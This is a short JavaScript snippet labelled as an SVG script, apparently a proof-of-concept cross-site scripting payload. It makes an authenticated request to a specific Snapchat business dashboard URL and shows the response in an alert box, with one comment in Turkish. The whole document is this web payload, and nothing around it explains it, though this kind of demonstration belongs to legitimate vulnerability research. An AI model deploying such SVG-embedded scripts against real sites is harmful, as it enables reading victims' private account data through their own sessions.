svg.script:
function makeRequest() {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://business.snapchat.com/42eb9ea1-f1f6-4e35-9d02-a2a5a24fdbae/dashboard", true);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      alert(xhr.responseText); // Yanıtı göstermek için bir uyarı kutusu kullanıyoruz
    }
  };
  xhr.send();
}
